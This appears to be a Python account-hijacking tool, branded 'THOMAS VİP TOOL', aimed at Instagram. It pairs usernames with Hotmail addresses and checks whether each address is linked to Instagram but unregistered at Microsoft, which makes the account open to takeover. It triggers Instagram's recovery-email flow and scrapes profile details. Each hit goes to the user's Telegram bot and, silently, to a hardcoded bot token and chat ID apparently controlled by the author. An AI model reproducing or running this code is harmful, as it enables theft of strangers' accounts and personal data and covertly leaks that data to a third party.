import os
try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_instgram=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'

logo='''▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[1;36m

────░░░───────────────────────────░░░───
─░░░─────────░▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▓▓─────░───
░░──────▒█████████████▓▓▓▓▓▒▓▓██▓────░──
░────▒███▓▒▒░──░▒▒░──░░░░░░░────██────░─
░───██░───░░▒░░░░───░─░░▒▒▓▓▒░───██───░░
───▓█───▒░───▒░────▒───────▒▒▒░──░█────░
───█▒─────────░──────▓████▒───────██────
──██────██████─────██▓▓█████▓─░────██───
─██▒░───▓███████──░████▓█▓▒█▒─▓▓▓█▒─██▓─
▓█─░▓██▓──────█─────▒───▒█▓░▒███▓░██──█▒
██──▒░▒███▒──██───────────▒▒▒──▒█──██─░█
░█─░──█────██▓─────▓██▒─────▒██▒██▒▓█──█
─██░─██░───██▓───██▓░█──▒████───█░─█░─██
──█──████▓───▒██───░████▓░─██▒███────██─
──█▓─█▓█░███████████▒░█──▒███▒██────██──
──█▓─███░█▓──█▒─░█───▒███████▓█────██───
──██─███████████████████───░██────▓█────
──██─██████████████▒───█──██▓────░█░───░
──█▓─░██▓█─█─▒█───█────████─────██▒───░░
──█▒──▒██████▒█▒▒███████▒──░▒▓███─────░─
──█░──────▒▒██████▒▒░░──░▒░▓███▒──────░─
──█──▒─▒▒──────────░▒▒░──▓██░────░░────░
──█──░▒▒▒▒▒░░─░─░─░───░███████▒───░────░
──██─────────────░▒▒▓███████████──░░───░
───██▓░──────▒▓████▓░──█████████▒──░────
──░──█████████████───▒▓██████████──░░───
──░──██████████████▒▓████████████░──░───
──░──▓███████████▓───░███████████▓──░───
──░───███████████─────████████████──░───
───░───██████████░▒███████████████──░───
───░░───▓███████████████████▒─▓██───░───
───░▒───█████████████████████──────░░───
──░░───██████████████████████───░░░─────
─░░───████████████████████████──░▒─────░
─░───█████████████████████████───▒─────░
░───██████████████████████████▓───░░────
░──▓███████████████████████████░───░░───
──░█████████████████████████████▓───░░──
░──▓██████████████████████████████────░─
░────▓█████████████████████████████░───░
▒────███████████████████████████████▒──░
───▒█████████████████████████████████───
──▒███████████████████████████████████──
─░████████████████████████████████████──
─█████████████░─────────░█████████████░─
─███████████░─────────────████████████──
─▓██████████───░░░░░░▒▒───▒███████████──
──██████████──░░────░░───░███████████▒──
──██████████──░─────░───█████████████───
───█████████──░░───░───█████████████───░
░──█████████───░───░───███████████▒───░░
░──▒████████░──░───░──██████████▒────░░─
░───████████▓──░───░──███▓████▒────░░───
░░──████████───░───░───██░─▓─────░░░────
─░──▒███▒─█▓──░░───░░───▒███───░░───────
─░░───░█░─▓█──░░────░░───███──░░──────░░
──░────█▓███──░──────░░───░───░────░░░──
──░░──█▒─██───░────────░─────░░───░░────
──░──░████───░░─────────░░░░░─────░─────
──░░──▒░────░░────▒░─────────────░──────

	      
	        <THOMAS VİP TOOL >
              TELEGRAM : @T5OMAS / @THOMASHACK
	
\033[1;97m ▬▬▬▬▬▬▬▬▬\
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''     

import os
import json
import random
import requests
import time
from uuid import uuid4
from user_agent import generate_user_agent
import json
import uuid
from hashlib import md5
from secrets import token_hex
from faker import Faker
import requests
from hashlib import md5
from user_agent import generate_user_agent
from random import randrange
from threading import Thread
from requests import post
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
ids=[]
ok = 0
hh = 0
no = 0
hh = 0
DvD = "android-" + str(uuid4())
uid = uuid.uuid4()
lopp = str(uuid.uuid4())
Lol = str(uuid.uuid4())
Gio = str(uuid.uuid4())
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
E = '\033[1;31m'
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'
Z = '\033[1;31m' #
R = '\033[1;31m' #
X = '\033[1;33m' #
F = '\033[2;32m' #
C = "\033[1;97m" #
B = '\033[2;36m'
Y = '\033[1;34m' #
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'
Z1 = '\033[2;31m' 
M = '\x1b[1;37m'
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

B = '\x1b[38;5;208m'  
Z = '\033[1;31m'  
X = '\033[1;33m'  
F = '\033[2;32m'  
C = "\033[1;97m"  
Z = '\033[1;31m' 
R = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'
S = '\033[1;33m'
B_ = '\033[2;36m'  #
K = '\033[2;35m'
U = '\033[2;35m'
Y = '\033[1;34m'
B = '\033[2;36m'#
Z = '\033[1;31m' #
X = '\033[1;33m' #
F = '\033[2;32m' #
C = "\033[1;97m" #
B = '\033[2;36m'#
Y = '\033[1;34m' #
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
S = '\033[1;33m'
import requests
import json
from datetime import datetime
import time
import os
B = '\x1b[38;5;208m'  
BYellow = '\x1b[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
y = '\033[1;35m'
f = '\033[2;35m'
z = '\033[3;33m'
G = '\033[2;36m'
E = '\033[1;31m'
DS='\033[30m' 
V = '\033[1;35m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m' 
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
O = '\x1b[38;5;208m' 
BL = '\x1b[38;5;21m' 
YU = '\x1b[38;5;200m'
G = '\033[1;35m'
Z = '\033[1;31m'  
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m'  
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

import requests,faker,user_agent,random
from user_agent import generate_user_agent
from faker import Faker
import os
try:
    import requests,colorama,prettytable,webbrowser
except:
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system("pip install prettytable")
    os.system("pip install webbrowser")
    os.system('pip install python-cfonts')
    os.system('pip install Faker')
    os.system('pip install AegosPy ')
    os.system('pip install threading ')
    os.system('pip install GetInfoInsta')
    os.system("clear")	
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' 
Q = '\033[1;36m'
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m' 
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
e=0
import os,random,sys,time
os.system("pkg install espeak")
os.system("clear")
from os import system as _HERON_
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.01)
            sys.stdout.flush()
lo(" \x1b[1;36m     Api İle Bağlantı Kuruluyor ...")
os.system('clear')            
from cfonts import render            
output = render('THOMAS', colors=['white', 'blue'], align='center')
print(output)
print("~ Programmer : @T5OMAS | Channel: @THOMASHACK ~")
print("\x1b[1;39m—" * 60)
webbrowser.open('https://t.me/thomashack')

import os
try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_instgram=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
token = input(f' {Q}({Q}1{Q}) {Q}  𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {F}:   ' + Z)
print("\x1b[1;39m—" * 60)
ID = input(f' {Q}({Q}2{Q}) {Q}  𝐈𝐃 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {F} :  ' + Z)
print("\x1b[1;39m—" * 60)
def namefile():
  while True:
    try:
      namefile1 = input(f" {Q}({Q}3{Q}) {Q}  𝐃𝐨𝐬𝐲𝐚𝐲ı 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 : ")
      ooo=open(namefile1,"r").read().splitlines()
      return ooo
    except:
      print(f"{RED}{BOLD} Dosya Bulunamadi ❌")
list99=namefile()

def check_gmail(email):
  global bads_email
  try:
    r=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
    mc=r.cookies.get_dict()['amsc']
    ca=str.encode(r.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
    cookies = {
      'amsc':mc,

    }
    headers = {
      'authority': 'signup.live.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': ca,
      'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
    }

    json_data = {
      'signInName': email,
    }
    response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',
      cookies=cookies,
      headers=headers,
      json=json_data,
    ).text
    if 'isAvailable' in response:
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:Qredes(email)

os.system('clear')
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='h h h'
  return r
def info(username, jj):
    global hits
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://www.tucktools.com',
        'Referer': 'https://www.tucktools.com/',
        'User-Agent': generate_user_agent()
    }
    params = {
        'username': username,
    }
    hits += 1

    try:
        response = requests.get('https://instaskull.com/tucktools_new', params=params, headers=headers).json()
        id = response['id']
        name = response['user_fullname']
        user_followers = response['user_followers']
        user_following = response['user_following']
        total_posts = response['total_posts']
        user_description = response['user_description']
        try:
            date = requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
        except:
            date = 'None'
        tlg = f'''
 𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇
⋘─────━𝐓𝐇𝐎𝐌𝐀𝐒━─────⋙
🪘𝐈𝐒𝐈𝐌 : {name}
🍬𝐊𝐔𝐋𝐋𝐀𝐍𝐈𝐂𝐈 𝐀𝐃𝐈: {username}
🐝𝐄𝐌𝐀𝐈𝐋 : {username}@{jj}
🧃𝐓𝐀𝐊𝐈𝐏𝐂𝐈: {user_followers}
🍉𝐓𝐀𝐊𝐈𝐏: {user_following}
🙈𝐏𝐎𝐒𝐓 :  {total_posts}
🍼𝐓𝐀𝐑𝐈𝐇: {date}
🌿𝐈𝐃: : {id}
🌷𝐁𝐈𝐎:  {user_description}
🐦𝐑𝐄𝐒𝐓: {rest(username)}
⋘─────━𝐓𝐇𝐎𝐌𝐀𝐒━─────⋙
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌;  @T5OMAS @THOMASHACK
        '''
        print(GREEN+tlg)
        with open('hits1.txt', 'a') as ff:
            ff.write(f'{tlg}\n')
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        except:
            pass
        try:
            requests.get(f"https://api.telegram.org/bot6968461161:AAHOZeHYEZEyQD4UAhqhL-pDeumCKZTkHc4/sendMessage?chat_id=6050993546&text={tlg}")
        except:
            pass
    except:
        tlg = f'''
        𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇
⋘─────━𝐓𝐇𝐎𝐌𝐀𝐒━─────⋙
 🍬𝐊𝐔𝐋𝐋𝐀𝐍𝐈𝐂𝐈 𝐀𝐃𝐈: {username}
🐝𝐄𝐌𝐀𝐈𝐋 : {username}@{jj}
🐦𝐑𝐄𝐒𝐓: {rest(username)}
⋘─────━𝐓𝐇𝐎𝐌𝐀𝐒━─────⋙
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌;  @T5OMAS @THOMASHACK
        '''
        print(BLUE+tlg)
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        except:
            pass
        try:
            requests.get(f"https://api.telegram.org/bot6968461161:AAHOZeHYEZEyQD4UAhqhL-pDeumCKZTkHc4/sendMessage?chat_id=6050993546&text={tlg}")
        except:
            pass
        with open('thomas2011.txt', 'a') as ff:
            ff.write(f'{tlg}\n')

def Qredes(email):
  global bads_email
  try:

    if 'isAvailable' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:''
   
def check(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('001')
    os.system('clear' if os.name == 'posix' else 'cls')
  
    tt=(f"\r{GREEN}Hit Düştü :{GREEN} {hits} {RED} Kötü  instgram:{RED} {bads_instgram} {YELLOW} Orta Email:{YELLOW} {bads_email}")
    print(tt)
    if pp == '0':
      headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
      #print(response.text)
      if 'email_is_taken' in str(response.text):Qredes(email)
      else:bads_instgram+=1
    elif pp == '1':
      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://www.instagram.com',
          'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
          'user-agent': ua,
          'x-csrftoken': csrftoken,
      }
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text
      #print(str(response))
      if '"user":true' in response:Qredes(email)
      else:bads_instgram+=1
  except:''

  os.system('clear' if os.name == 'posix' else 'cls')

  tt=(f"\r{GREEN}Hit Düştü :{GREEN} {hits} {RED} Kötü  instgram:{RED} {bads_instgram} {YELLOW} Orta Email:{YELLOW} {bads_email}")
  print(tt)


executor = ThreadPoolExecutor(max_workers=70)


for username in list99:
    try:
      if '@' in username:username=username.split('@')[0]
      email = username + '@hotmail.com'
      executor.submit(check, email)
    except:''

# by @Qredes @t5omas
